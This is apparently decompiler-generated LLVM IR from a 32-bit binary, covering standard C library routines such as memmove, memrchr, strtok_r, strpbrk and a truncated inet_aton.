dec_label_pc_8054b40:                             ; preds = %dec_label_pc_8054b37.dec_label_pc_8054b40_crit_edge, %dec_label_pc_8054b3b
  %v0_8054b40 = phi i32 [ %phitmp, %dec_label_pc_8054b37.dec_label_pc_8054b40_crit_edge ], [ 0, %dec_label_pc_8054b3b ]
  %v8_8054b40 = icmp eq i32 %v0_8054b40, 0
  store i1 %v8_8054b40, i1* %zf.global-to-local, align 1
  store i32 %v0_8054b40, i32* %edi.global-to-local, align 4
  %v2_8054b45.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8054b43

dec_label_pc_8054b43:                             ; preds = %entry, %dec_label_pc_8054b40
  %v2_8054b45 = phi i32 [ %v0_8054b24, %entry ], [ %v2_8054b45.pre, %dec_label_pc_8054b40 ]
  %v0_8054b43 = phi i32 [ 0, %entry ], [ %v0_8054b40, %dec_label_pc_8054b40 ]
  store i32 %v2_8054b45, i32* @edi, align 4
  ret i32 %v0_8054b43

; uselistorder directives
  uselistorder i32 %v0_8054b40, { 2, 0, 1 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_8054b43, { 1, 0 }
  uselistorder label %dec_label_pc_8054b40, { 1, 0 }
}

define i32 @memmove(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_8054b49 = load i32, i32* @esi, align 4
  store i32 %v0_8054b49, i32* %stack_var_-8, align 4
  %v4_8054b4a = ptrtoint i8* %arg1 to i32
  %v9_8054b56 = icmp ugt i8* %tmp3, %arg1
  %v1_8054b58 = icmp eq i1 %v9_8054b56, false
  br i1 %v1_8054b58, label %dec_label_pc_8054b60, label %dec_label_pc_8054b5a

dec_label_pc_8054b5a:                             ; preds = %entry
  %v7_8054b5c = call i8* @_memcpy(i8* %arg1, i8* %tmp3, i32 %tmp)
  br label %dec_label_pc_8054b6c

dec_label_pc_8054b60:                             ; preds = %entry
  %v3_8054b60 = add i32 %arg2, -1
  %v4_8054b60 = add i32 %v3_8054b60, %tmp
  %v5_8054b60 = inttoptr i32 %v4_8054b60 to i8*
  %v3_8054b64 = add i32 %v4_8054b4a, -1
  %v4_8054b64 = add i32 %v3_8054b64, %tmp
  %v5_8054b64 = inttoptr i32 %v4_8054b64 to i8*
  %v7_8054b69 = call i8* @_memcpy(i8* %v5_8054b64, i8* %v5_8054b60, i32 %tmp)
  store i1 false, i1* @df, align 1
  br label %dec_label_pc_8054b6c

dec_label_pc_8054b6c:                             ; preds = %dec_label_pc_8054b5a, %dec_label_pc_8054b60
  %v2_8054b6c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8054b6c, i32* @esi, align 4
  ret i32 %v4_8054b4a

; uselistorder directives
  uselistorder i8* %tmp3, { 1, 0 }
  uselistorder i32 %tmp, { 0, 3, 1, 2 }
  uselistorder i8* %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8054b6c, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_8054b70 = load i32, i32* @esi, align 4
  store i32 %arg1, i32* @esi, align 4
  %v3_8054b83 = inttoptr i32 %arg1 to i16*
  %v4_8054b83 = call i32 @memcpy(i16* %v3_8054b83, i32 %arg2, i32 %arg3)
  %v0_8054b88 = load i32, i32* @esi, align 4
  %v2_8054b88 = add i32 %v0_8054b88, %arg3
  store i32 %v0_8054b70, i32* @esi, align 4
  ret i32 %v2_8054b88
}

define i32 @memrchr(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg2 to i8
  %v4_8054b99 = urem i32 %arg2, 256
  %v4_8054ba5 = sext i8 %arg1 to i32
  %v2_8054ba9 = add i32 %v4_8054ba5, %arg3
  %v1_8054bbb7 = icmp eq i32 %arg3, 0
  br i1 %v1_8054bbb7, label %dec_label_pc_8054bc3, label %dec_label_pc_8054bbf

dec_label_pc_8054bad:                             ; preds = %dec_label_pc_8054bbf
  %v1_8054bad = add i32 %v0_8054bad, -1
  %v5_8054bae = load i32, i32* @edx, align 4
  %v6_8054bae = and i32 %v5_8054bae, -256
  %v7_8054bae = or i32 %v6_8054bae, %v4_8054b99
  store i32 %v7_8054bae, i32* @edx, align 4
  %v1_8054bb2 = inttoptr i32 %v1_8054bad to i8*
  %v2_8054bb2 = load i8, i8* %v1_8054bb2, align 1
  %v15_8054bb2 = icmp eq i8 %v2_8054bb2, %tmp
  br i1 %v15_8054bb2, label %dec_label_pc_8054c40, label %dec_label_pc_8054bba

dec_label_pc_8054bba:                             ; preds = %dec_label_pc_8054bad
  %v1_8054bba = add i32 %v0_8054bba, -1
  %v8_8054bba = icmp eq i32 %v1_8054bba, 0
  br i1 %v8_8054bba, label %dec_label_pc_8054bc3, label %dec_label_pc_8054bbf

dec_label_pc_8054bbf:                             ; preds = %entry, %dec_label_pc_8054bba
  %v0_8054bba = phi i32 [ %v1_8054bba, %dec_label_pc_8054bba ], [ %arg3, %entry ]
  %v0_8054bad = phi i32 [ %v1_8054bad, %dec_label_pc_8054bba ], [ %v2_8054ba9, %entry ]
  %v2_8054bbf = urem i32 %v0_8054bad, 4
  %v3_8054bbf = icmp eq i32 %v2_8054bbf, 0
  %v1_8054bc1 = icmp eq i1 %v3_8054bbf, false
  br i1 %v1_8054bc1, label %dec_label_pc_8054bad, label %dec_label_pc_8054bc3

dec_label_pc_8054bc3:                             ; preds = %dec_label_pc_8054bba, %dec_label_pc_8054bbf, %entry
  %v0_8054c26.pr = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_8054bba ], [ %v0_8054bba, %dec_label_pc_8054bbf ]
  %v0_8054bc8 = phi i32 [ %v2_8054ba9, %entry ], [ %v1_8054bad, %dec_label_pc_8054bba ], [ %v0_8054bad, %dec_label_pc_8054bbf ]
  store i32 %v0_8054bc8, i32* @ecx, align 4
  %v2_8054bcc = mul nuw nsw i32 %v4_8054b99, 256
  %v2_8054bcf = or i32 %v2_8054bcc, %v4_8054b99
  %v2_8054bd3 = mul i32 %v2_8054bcf, 65536
  %v2_8054bd6 = or i32 %v2_8054bd3, %v2_8054bcf
  %v6_8054c2950 = icmp ugt i32 %v0_8054c26.pr, 3
  br i1 %v6_8054c2950, label %dec_label_pc_8054bda, label %dec_label_pc_8054c2b

dec_label_pc_8054bda:                             ; preds = %dec_label_pc_8054bc3, %dec_label_pc_8054c23
  %v0_8054c2352 = phi i32 [ %v1_8054c23, %dec_label_pc_8054c23 ], [ %v0_8054c26.pr, %dec_label_pc_8054bc3 ]
  %v0_8054bda51 = phi i32 [ %v1_8054bda, %dec_label_pc_8054c23 ], [ %v0_8054bc8, %dec_label_pc_8054bc3 ]
  %v1_8054bda = add i32 %v0_8054bda51, -4
  store i32 %v1_8054bda, i32* @ecx, align 4
  %v2_8054bdf = inttoptr i32 %v1_8054bda to i32*
  %v3_8054bdf = load i32, i32* %v2_8054bdf, align 4
  %v4_8054bdf = xor i32 %v3_8054bdf, %v2_8054bd6
  %v1_8054be1 = add i32 %v4_8054bdf, 2130640639
  %v1_8054be7 = sub i32 -1, %v4_8054bdf
  %v2_8054be9 = xor i32 %v1_8054be1, %v1_8054be7
  %v1_8054beb = and i32 %v2_8054be9, -2130640640
  %v2_8054beb = icmp eq i32 %v1_8054beb, 0
  br i1 %v2_8054beb, label %dec_label_pc_8054c23, label %dec_label_pc_8054bf3

dec_label_pc_8054bf3:                             ; preds = %dec_label_pc_8054bda
  %v7_8054bf3 = or i32 %v1_8054beb, %v4_8054b99
  %v1_8054bf7 = add i32 %v0_8054bda51, -1
  %v2_8054bfa = inttoptr i32 %v1_8054bf7 to i8*
  %v3_8054bfa = load i8, i8* %v2_8054bfa, align 1
  %v16_8054bfa = icmp eq i8 %v3_8054bfa, %tmp
  br i1 %v16_8054bfa, label %dec_label_pc_8054c40, label %dec_label_pc_8054bff

dec_label_pc_8054bff:                             ; preds = %dec_label_pc_8054bf3
  %v1_8054c03 = add i32 %v0_8054bda51, -2
  %v2_8054c06 = inttoptr i32 %v1_8054c03 to i8*
  %v3_8054c06 = load i8, i8* %v2_8054c06, align 1
  %v16_8054c06 = icmp eq i8 %v3_8054c06, %tmp
  br i1 %v16_8054c06, label %dec_label_pc_8054c40, label %dec_label_pc_8054c0b

dec_label_pc_8054c0b:                             ; preds = %dec_label_pc_8054bff
  %v1_8054c0f = add i32 %v0_8054bda51, -3
  %v2_8054c12 = inttoptr i32 %v1_8054c0f to i8*
  %v3_8054c12 = load i8, i8* %v2_8054c12, align 1
  %v16_8054c12 = icmp eq i8 %v3_8054c12, %tmp
  br i1 %v16_8054c12, label %dec_label_pc_8054c40, label %dec_label_pc_8054c17

dec_label_pc_8054c17:                             ; preds = %dec_label_pc_8054c0b
  %v1_8054c1b = inttoptr i32 %v1_8054bda to i8*
  %v2_8054c1b = load i8, i8* %v1_8054c1b, align 1
  %v15_8054c1b = icmp eq i8 %v2_8054c1b, %tmp
  %v1_8054c1d = icmp eq i1 %v15_8054c1b, false
  br i1 %v1_8054c1d, label %dec_label_pc_8054c23, label %dec_label_pc_8054c1f

dec_label_pc_8054c1f:                             ; preds = %dec_label_pc_8054c17
  br label %dec_label_pc_8054c40

dec_label_pc_8054c23:                             ; preds = %dec_label_pc_8054c17, %dec_label_pc_8054bda
  %v5_8054c3027 = phi i32 [ %v7_8054bf3, %dec_label_pc_8054c17 ], [ 0, %dec_label_pc_8054bda ]
  %v1_8054c23 = add i32 %v0_8054c2352, -4
  %v6_8054c29 = icmp ugt i32 %v1_8054c23, 3
  br i1 %v6_8054c29, label %dec_label_pc_8054bda, label %dec_label_pc_8054c2b

dec_label_pc_8054c2b:                             ; preds = %dec_label_pc_8054c23, %dec_label_pc_8054bc3
  %v5_8054c3026.lcssa = phi i32 [ %v4_8054b99, %dec_label_pc_8054bc3 ], [ %v5_8054c3027, %dec_label_pc_8054c23 ]
  %v0_8054bda.lcssa = phi i32 [ %v0_8054bc8, %dec_label_pc_8054bc3 ], [ %v1_8054bda, %dec_label_pc_8054c23 ]
  %v0_8054c23.lcssa = phi i32 [ %v0_8054c26.pr, %dec_label_pc_8054bc3 ], [ %v1_8054c23, %dec_label_pc_8054c23 ]
  br label %dec_label_pc_8054c38

dec_label_pc_8054c2f:                             ; preds = %dec_label_pc_8054c38
  %v1_8054c38 = add i32 %v0_8054c38, -1
  %v1_8054c2f = add i32 %v0_8054c2f, -1
  %v6_8054c30 = and i32 %v5_8054c30, -256
  %v7_8054c30 = or i32 %v6_8054c30, %v4_8054b99
  %v1_8054c34 = inttoptr i32 %v1_8054c2f to i8*
  %v2_8054c34 = load i8, i8* %v1_8054c34, align 1
  %v15_8054c34 = icmp eq i8 %v2_8054c34, %tmp
  br i1 %v15_8054c34, label %dec_label_pc_8054c40, label %dec_label_pc_8054c38

dec_label_pc_8054c38:                             ; preds = %dec_label_pc_8054c2f, %dec_label_pc_8054c2b
  %v5_8054c30 = phi i32 [ %v7_8054c30, %dec_label_pc_8054c2f ], [ %v5_8054c3026.lcssa, %dec_label_pc_8054c2b ]
  %v0_8054c2f = phi i32 [ %v1_8054c2f, %dec_label_pc_8054c2f ], [ %v0_8054bda.lcssa, %dec_label_pc_8054c2b ]
  %v0_8054c38 = phi i32 [ %v1_8054c38, %dec_label_pc_8054c2f ], [ %v0_8054c23.lcssa, %dec_label_pc_8054c2b ]
  %v10_8054c39 = icmp eq i32 %v0_8054c38, 0
  %v1_8054c3c = icmp eq i1 %v10_8054c39, false
  br i1 %v1_8054c3c, label %dec_label_pc_8054c2f, label %dec_label_pc_8054c3e

dec_label_pc_8054c3e:                             ; preds = %dec_label_pc_8054c38
  br label %dec_label_pc_8054c40

dec_label_pc_8054c40:                             ; preds = %dec_label_pc_8054bad, %dec_label_pc_8054c0b, %dec_label_pc_8054bff, %dec_label_pc_8054bf3, %dec_label_pc_8054c2f, %dec_label_pc_8054c1f, %dec_label_pc_8054c3e
  %v0_8054c43 = phi i32 [ %v1_8054bda, %dec_label_pc_8054c1f ], [ 0, %dec_label_pc_8054c3e ], [ %v1_8054c2f, %dec_label_pc_8054c2f ], [ %v1_8054c0f, %dec_label_pc_8054c0b ], [ %v1_8054c03, %dec_label_pc_8054bff ], [ %v1_8054bf7, %dec_label_pc_8054bf3 ], [ %v1_8054bad, %dec_label_pc_8054bad ]
  ret i32 %v0_8054c43

; uselistorder directives
  uselistorder i32 %v0_8054c38, { 1, 0 }
  uselistorder i32 %v1_8054c23, { 0, 2, 1 }
  uselistorder i32 %v1_8054bda, { 2, 0, 3, 4, 5, 1 }
  uselistorder i32 %v0_8054bda51, { 3, 2, 1, 0 }
  uselistorder i32 %v2_8054bcf, { 1, 0 }
  uselistorder i32 %v0_8054bad, { 1, 0, 2 }
  uselistorder i32 %v2_8054ba9, { 1, 0 }
  uselistorder i32 %v4_8054b99, { 4, 5, 3, 2, 0, 1 }
  uselistorder i8 %tmp, { 5, 1, 2, 3, 4, 0 }
  uselistorder i32 -2, { 2, 7, 0, 16, 17, 1, 15, 19, 14, 20, 3, 5, 4, 21, 8, 9, 10, 18, 11, 12, 6, 13 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8054c40, { 6, 4, 5, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_8054bda, { 1, 0 }
  uselistorder label %dec_label_pc_8054bc3, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8054bbf, { 1, 0 }
}

define i32 @strtok_r(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8054c44 = load i32, i32* @edi, align 4
  %v0_8054c45 = load i32, i32* @esi, align 4
  %v0_8054c46 = load i32, i32* @ebx, align 4
  store i32 %v0_8054c46, i32* %stack_var_-12, align 4
  %v4_8054c47 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8054c47, i32* @ebx, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_8054c53 = icmp eq i8* %arg1, null
  %v1_8054c55 = icmp eq i1 %v1_8054c53, false
  br i1 %v1_8054c55, label %dec_label_pc_8054c59, label %dec_label_pc_8054c57

dec_label_pc_8054c57:                             ; preds = %entry
  %v1_8054c57 = inttoptr i32 %arg3 to i32*
  %v2_8054c57 = load i32, i32* %v1_8054c57, align 4
  store i32 %v2_8054c57, i32* @ebx, align 4
  br label %dec_label_pc_8054c59

dec_label_pc_8054c59:                             ; preds = %entry, %dec_label_pc_8054c57
  %v0_8054c5c = phi i32 [ %v4_8054c47, %entry ], [ %v2_8054c57, %dec_label_pc_8054c57 ]
  %v0_8054c59 = load i32, i32* @ecx, align 4
  %v5_8054c5c = inttoptr i32 %v0_8054c5c to i8*
  %v8_8054c5d = call i32 @__GI_strspn(i8* %v5_8054c5c, i32 %arg2, i32 %v0_8054c59, i32 %v0_8054c59)
  store i32 %v8_8054c5d, i32* %eax.global-to-local, align 4
  %v0_8054c65 = load i32, i32* @ebx, align 4
  %v2_8054c65 = add i32 %v0_8054c65, %v8_8054c5d
  store i32 %v2_8054c65, i32* @ebx, align 4
  %v1_8054c67 = inttoptr i32 %v2_8054c65 to i8*
  %v2_8054c67 = load i8, i8* %v1_8054c67, align 1
  %v3_8054c67 = icmp eq i8 %v2_8054c67, 0
  %v1_8054c6a = icmp eq i1 %v3_8054c67, false
  br i1 %v1_8054c6a, label %dec_label_pc_8054c72, label %dec_label_pc_8054c6c

dec_label_pc_8054c6c:                             ; preds = %dec_label_pc_8054c59
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_8054c6e = load i32, i32* @esi, align 4
  %v2_8054c6e = inttoptr i32 %v1_8054c6e to i32*
  store i32 %v2_8054c65, i32* %v2_8054c6e, align 4
  %v0_8054c9c.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054c99

dec_label_pc_8054c72:                             ; preds = %dec_label_pc_8054c59
  %v0_8054c72 = load i32, i32* @edx, align 4
  %v0_8054c74 = load i32, i32* @edi, align 4
  %v8_8054c76 = call i32 @__GI_strpbrk(i8* %v1_8054c67, i32 %v0_8054c74, i32 %v0_8054c72, i32 %v0_8054c72)
  store i32 %v8_8054c76, i32* %eax.global-to-local, align 4
  %v2_8054c7e = icmp eq i32 %v8_8054c76, 0
  %v1_8054c80 = icmp eq i1 %v2_8054c7e, false
  br i1 %v1_8054c80, label %dec_label_pc_8054c91, label %dec_label_pc_8054c82

dec_label_pc_8054c82:                             ; preds = %dec_label_pc_8054c72
  %v0_8054c86 = load i32, i32* @ebx, align 4
  %v5_8054c86 = inttoptr i32 %v0_8054c86 to i8*
  %v8_8054c87 = call i32 @rawmemchr(i8* %v5_8054c86, i32 0, i32 %v8_8054c76, i32 %v8_8054c76)
  br label %dec_label_pc_8054c95

dec_label_pc_8054c91:                             ; preds = %dec_label_pc_8054c72
  %v9_8054c76 = inttoptr i32 %v8_8054c76 to i8*
  store i8 0, i8* %v9_8054c76, align 1
  %v2_8054c94 = add i32 %v8_8054c76, 1
  br label %dec_label_pc_8054c95

dec_label_pc_8054c95:                             ; preds = %dec_label_pc_8054c82, %dec_label_pc_8054c91
  %storemerge = phi i32 [ %v2_8054c94, %dec_label_pc_8054c91 ], [ %v8_8054c87, %dec_label_pc_8054c82 ]
  %v0_8054c95 = phi i32 [ %v2_8054c94, %dec_label_pc_8054c91 ], [ %v8_8054c87, %dec_label_pc_8054c82 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_8054c95 = load i32, i32* @esi, align 4
  %v2_8054c95 = inttoptr i32 %v1_8054c95 to i32*
  store i32 %v0_8054c95, i32* %v2_8054c95, align 4
  %v0_8054c97 = load i32, i32* @ebx, align 4
  store i32 %v0_8054c97, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054c99

dec_label_pc_8054c99:                             ; preds = %dec_label_pc_8054c6c, %dec_label_pc_8054c95
  %v0_8054c9c = phi i32 [ %v0_8054c9c.pre, %dec_label_pc_8054c6c ], [ %v0_8054c97, %dec_label_pc_8054c95 ]
  %v2_8054c99 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8054c99, i32* @ebx, align 4
  store i32 %v0_8054c45, i32* @esi, align 4
  store i32 %v0_8054c44, i32* @edi, align 4
  ret i32 %v0_8054c9c

; uselistorder directives
  uselistorder i32 %v8_8054c76, { 3, 5, 0, 1, 2, 4 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8054c99, { 1, 0 }
  uselistorder label %dec_label_pc_8054c95, { 1, 0 }
  uselistorder label %dec_label_pc_8054c59, { 1, 0 }
}

define i32 @__GI_strpbrk(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_8054ca1 = load i32, i32* @ebx, align 4
  %v2_8054cb824 = load i8, i8* %arg1, align 1
  %v4_8054cba28 = icmp eq i8 %v2_8054cb824, 0
  br i1 %v4_8054cba28, label %dec_label_pc_8054cc2, label %dec_label_pc_8054cbe.lr.ph

dec_label_pc_8054cbe.lr.ph:                       ; preds = %entry
  %v3_8054cb825 = zext i8 %v2_8054cb824 to i32
  %v5_8054cb826 = and i32 %v0_8054ca1, -256
  %v6_8054cb827 = or i32 %v3_8054cb825, %v5_8054cb826
  %v4_8054ca6 = ptrtoint i8* %arg1 to i32
  %v1_8054cb113 = inttoptr i32 %arg2 to i8*
  %v4_8054cb1.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8054cbe

dec_label_pc_8054cac:                             ; preds = %dec_label_pc_8054cbe, %dec_label_pc_8054cb0
  %v6_8054cb122 = phi i32 [ %v6_8054cb1, %dec_label_pc_8054cb0 ], [ %v6_8054cb117, %dec_label_pc_8054cbe ]
  %v2_8054cb121 = phi i8 [ %v2_8054cb1, %dec_label_pc_8054cb0 ], [ %v2_8054cb114, %dec_label_pc_8054cbe ]
  %v0_8054cb020 = phi i32 [ %v1_8054cb0, %dec_label_pc_8054cb0 ], [ %arg2, %dec_label_pc_8054cbe ]
  %v15_8054cac = icmp eq i8 %v2_8054cb121, %v2_8054cb831
  br i1 %v15_8054cac, label %dec_label_pc_8054cc4, label %dec_label_pc_8054cb0

dec_label_pc_8054cb0:                             ; preds = %dec_label_pc_8054cac
  %v1_8054cb0 = add i32 %v0_8054cb020, 1
  store i32 %v1_8054cb0, i32* @edx, align 4
  %v1_8054cb1 = inttoptr i32 %v1_8054cb0 to i8*
  %v2_8054cb1 = load i8, i8* %v1_8054cb1, align 1
  %v3_8054cb1 = zext i8 %v2_8054cb1 to i32
  %v5_8054cb1 = and i32 %v6_8054cb122, -256
  %v6_8054cb1 = or i32 %v3_8054cb1, %v5_8054cb1
  store i32 %v6_8054cb1, i32* @ecx, align 4
  %v4_8054cb3 = icmp eq i8 %v2_8054cb1, 0
  %v1_8054cb5 = icmp eq i1 %v4_8054cb3, false
  br i1 %v1_8054cb5, label %dec_label_pc_8054cac, label %dec_label_pc_8054cb7

dec_label_pc_8054cb7:                             ; preds = %dec_label_pc_8054cb0, %dec_label_pc_8054cbe
  %v4_8054cb1.pre34 = phi i32 [ %v6_8054cb117, %dec_label_pc_8054cbe ], [ %v6_8054cb1, %dec_label_pc_8054cb0 ]
  %v1_8054cb7 = add i32 %v0_8054cb729, 1
  %v1_8054cb8 = inttoptr i32 %v1_8054cb7 to i8*
  %v2_8054cb8 = load i8, i8* %v1_8054cb8, align 1
  %v3_8054cb8 = zext i8 %v2_8054cb8 to i32
  %v5_8054cb8 = and i32 %v6_8054cb832, -256
  %v6_8054cb8 = or i32 %v3_8054cb8, %v5_8054cb8
  %v4_8054cba = icmp eq i8 %v2_8054cb8, 0
  br i1 %v4_8054cba, label %dec_label_pc_8054cc2, label %dec_label_pc_8054cbe

dec_label_pc_8054cbe:                             ; preds = %dec_label_pc_8054cbe.lr.ph, %dec_label_pc_8054cb7
  %v4_8054cb1.pre = phi i32 [ %v4_8054cb1.pre.pre, %dec_label_pc_8054cbe.lr.ph ], [ %v4_8054cb1.pre34, %dec_label_pc_8054cb7 ]
  %v6_8054cb832 = phi i32 [ %v6_8054cb827, %dec_label_pc_8054cbe.lr.ph ], [ %v6_8054cb8, %dec_label_pc_8054cb7 ]
  %v2_8054cb831 = phi i8 [ %v2_8054cb824, %dec_label_pc_8054cbe.lr.ph ], [ %v2_8054cb8, %dec_label_pc_8054cb7 ]
  %v0_8054cb729 = phi i32 [ %v4_8054ca6, %dec_label_pc_8054cbe.lr.ph ], [ %v1_8054cb7, %dec_label_pc_8054cb7 ]
  store i32 %arg2, i32* @edx, align 4
  %v2_8054cb114 = load i8, i8* %v1_8054cb113, align 1
  %v3_8054cb115 = zext i8 %v2_8054cb114 to i32
  %v5_8054cb116 = and i32 %v4_8054cb1.pre, -256
  %v6_8054cb117 = or i32 %v3_8054cb115, %v5_8054cb116
  store i32 %v6_8054cb117, i32* @ecx, align 4
  %v4_8054cb318 = icmp eq i8 %v2_8054cb114, 0
  %v1_8054cb519 = icmp eq i1 %v4_8054cb318, false
  br i1 %v1_8054cb519, label %dec_label_pc_8054cac, label %dec_label_pc_8054cb7

dec_label_pc_8054cc2:                             ; preds = %dec_label_pc_8054cb7, %entry
  br label %dec_label_pc_8054cc4

dec_label_pc_8054cc4:                             ; preds = %dec_label_pc_8054cac, %dec_label_pc_8054cc2
  %v0_8054cc6 = phi i32 [ 0, %dec_label_pc_8054cc2 ], [ %v0_8054cb729, %dec_label_pc_8054cac ]
  store i32 %v0_8054ca1, i32* @ebx, align 4
  ret i32 %v0_8054cc6

; uselistorder directives
  uselistorder i32 %v6_8054cb117, { 2, 0, 1 }
  uselistorder i8 %v2_8054cb114, { 1, 2, 0 }
  uselistorder i32 %v1_8054cb7, { 1, 0 }
  uselistorder i32 %v6_8054cb1, { 1, 2, 0 }
  uselistorder i8 %v2_8054cb1, { 1, 2, 0 }
  uselistorder i32 %v1_8054cb0, { 2, 1, 0 }
  uselistorder i8 %v2_8054cb824, { 0, 2, 1 }
  uselistorder i32 %v0_8054ca1, { 1, 0 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8054cc4, { 1, 0 }
  uselistorder label %dec_label_pc_8054cbe, { 1, 0 }
  uselistorder label %dec_label_pc_8054cb7, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_8054ccf = ptrtoint i8* %arg1 to i32
  store i32 %v4_8054ccf, i32* @ecx, align 4
  %v1_8054cd3 = icmp eq i8* %arg1, null
  br i1 %v1_8054cd3, label %dec_label_pc_8054d54, label %dec_label_pc_8054cd7

dec_label_pc_8054cd7:                             ; preds = %entry
  %v0_8054ce5.pre = load i32, i32* @global_var_80612cc, align 4
  br label %dec_label_pc_8054ce2

dec_label_pc_8054ce2:                             ; preds = %dec_label_pc_8054cd7, %dec_label_pc_8054d2b
  %v2_8054d2e35 = phi i32 [ 1, %dec_label_pc_8054cd7 ], [ %v3_8054d2e, %dec_label_pc_8054d2b ]
  %v0_8054ce234 = phi i32 [ %v4_8054ccf, %dec_label_pc_8054cd7 ], [ %v0_8054ce23, %dec_label_pc_8054d2b ]
  %v0_8054d4933 = phi i32 [ 0, %dec_label_pc_8054cd7 ], [ %v2_8054d31, %dec_label_pc_8054d2b ]
  %v1_8054ce2 = inttoptr i32 %v0_8054ce234 to i8*
  %v2_8054ce2 = load i8, i8* %v1_8054ce2, align 1
  %v3_8054ce2 = sext i8 %v2_8054ce2 to i32
  %v2_8054ceb = mul nsw i32 %v3_8054ce2, 2
  %v3_8054ceb = add i32 %v2_8054ceb, %v0_8054ce5.pre
  %v4_8054ceb = inttoptr i32 %v3_8054ceb to i8*
  %v5_8054ceb = load i8, i8* %v4_8054ceb, align 1
  %v6_8054ceb = and i8 %v5_8054ceb, 8
  %v7_8054ceb = icmp eq i8 %v6_8054ceb, 0
  br i1 %v7_8054ceb, label %dec_label_pc_8054d54, label %dec_label_pc_8054cf2

dec_label_pc_8054cf2:                             ; preds = %dec_label_pc_8054ce2
  %v4_8054d06.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8054d06

dec_label_pc_8054cf6:                             ; preds = %dec_label_pc_8054d06
  %v3_8054cf6 = mul i32 %v1_8054cf6, 10
  %v2_8054cf9 = add i32 %v3_8054cf6, -48
  %v3_8054cf9 = add i32 %v2_8054cf9, %v2_8054d08
  %v1_8054cfd = add i32 %v3_8054cf9, -255
  %v6_8054cfd = sub i32 254, %v3_8054cf9
  %v7_8054cfd = and i32 %v6_8054cfd, %v3_8054cf9
  %v8_8054cfd = icmp slt i32 %v7_8054cfd, 0
  %v9_8054cfd = icmp eq i32 %v1_8054cfd, 0
  %v10_8054cfd = icmp slt i32 %v1_8054cfd, 0
  %v3_8054d03 = icmp eq i1 %v10_8054cfd, %v8_8054cfd
  %v4_8054d03 = icmp eq i1 %v9_8054cfd, false
  %v5_8054d03 = and i1 %v4_8054d03, %v3_8054d03
  br i1 %v5_8054d03, label %dec_label_pc_8054d54, label %dec_label_pc_8054d05

dec_label_pc_8054d05:                             ; preds = %dec_label_pc_8054cf6
  %v1_8054d05 = add i32 %v0_8054d05, 1
  store i32 %v1_8054d05, i32* @ecx, align 4
  br label %dec_label_pc_8054d06

dec_label_pc_8054d06:                             ; preds = %dec_label_pc_8054cf2, %dec_label_pc_8054d05
  %v1_8054cf6 = phi i32 [ 0, %dec_label_pc_8054cf2 ], [ %v3_8054cf9, %dec_label_pc_8054d05 ]
  %v4_8054d06 = phi i32 [ %v4_8054d06.pre, %dec_label_pc_8054cf2 ], [ %v6_8054d06, %dec_label_pc_8054d05 ]
  %v0_8054d05 = phi i32 [ %v0_8054ce234, %dec_label_pc_8054cf2 ], [ %v1_8054d05, %dec_label_pc_8054d05 ]
  %v1_8054d06 = inttoptr i32 %v0_8054d05 to i8*
  %v2_8054d06 = load i8, i8* %v1_8054d06, align 1
  %v3_8054d06 = zext i8 %v2_8054d06 to i32
  %v5_8054d06 = and i32 %v4_8054d06, -256
  %v6_8054d06 = or i32 %v3_8054d06, %v5_8054d06
  store i32 %v6_8054d06, i32* @edx, align 4
  %v2_8054d08 = sext i8 %v2_8054d06 to i32
  %v2_8054d0b = mul nsw i32 %v2_8054d08, 2
  %v3_8054d0b = add i32 %v2_8054d0b, %v0_8054ce5.pre
  %v4_8054d0b = inttoptr i32 %v3_8054d0b to i16*
  %v5_8054d0b = load i16, i16* %v4_8054d0b, align 2
  %v2_8054d10 = and i16 %v5_8054d0b, 8
  %v3_8054d10 = icmp eq i16 %v2_8054d10, 0
  %v1_8054d12 = icmp eq i1 %v3_8054d10, false
  br i1 %v1_8054d12, label %dec_label_pc_8054cf6, label %dec_label_pc_8054d14

dec_label_pc_8054d14:                             ; preds = %dec_label_pc_8054d06
  %v8_8054d14 = sub nsw i32 2, %v2_8054d2e35
  %v9_8054d14 = and i32 %v8_8054d14, %v2_8054d2e35
  %v10_8054d14 = icmp slt i32 %v9_8054d14, 0
  %v11_8054d14 = icmp eq i32 %v2_8054d2e35, 3
  %v12_8054d14 = icmp slt i32 %v2_8054d2e35, 3
  %v3_8054d18 = icmp eq i1 %v12_8054d14, %v10_8054d14
  %v4_8054d18 = icmp eq i1 %v11_8054d14, false
  %v5_8054d18 = and i1 %v4_8054d18, %v3_8054d18
